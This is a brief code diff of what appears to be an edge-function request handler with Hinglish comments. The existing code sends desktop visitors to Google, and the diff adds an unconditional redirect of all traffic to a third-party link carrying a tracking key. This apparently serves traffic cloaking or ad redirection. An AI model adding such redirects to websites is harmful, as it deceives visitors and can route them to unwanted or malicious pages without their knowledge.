@@ -4,7 +4,7 @@ export async function onRequest(context) {
   
   // Mobile devices ko pehchanein
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-
+return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
   // Agar user DESKTOP se hai, to use raste se hi Google par bhej dein
   if (!isMobile) {
     return Response.redirect("https://www.google.com", 302);
